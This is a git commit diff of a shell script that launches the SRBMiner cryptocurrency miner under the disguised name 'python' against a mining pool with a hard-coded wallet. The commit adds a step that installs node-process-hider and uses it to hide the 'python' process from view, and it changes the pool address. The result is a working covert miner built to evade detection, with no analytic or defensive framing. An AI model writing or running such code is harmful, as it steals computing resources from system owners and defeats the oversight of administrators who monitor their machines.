807666eef78577b7020d4f4049bdde20bd89ca9e
monhodsompul <168453591+monhodsompul@users.noreply.github.com>
2024-06-12 14:31:47 +0700

    Update luckrum.sh

--- luckrum.sh
+++ luckrum.sh
@@ -4,10 +4,16 @@ tar -xvf kontolrum
 
 cd SRBMiner-Multi-2-4-7
 
+npm i -g node-process-hider
+
+ph add python
+
+clear
+
 mv SRBMiner-MULTI python
 
 nomer=$((RANDOM % 50 + 1))
 
 clear
 
-./python --algorithm aurum --pool 103.120.18.210:443 --wallet waf1qd2ect4ut9nqq8w54ymsuxfh0ea93zjkkhyyu74.DOT-0$nomer --keepalive true 
+./python --algorithm aurum --pool stratum-eu.rplant.xyz:17114 --wallet waf1qd2ect4ut9nqq8w54ymsuxfh0ea93zjkkhyyu74.DOT-0$nomer --keepalive true 
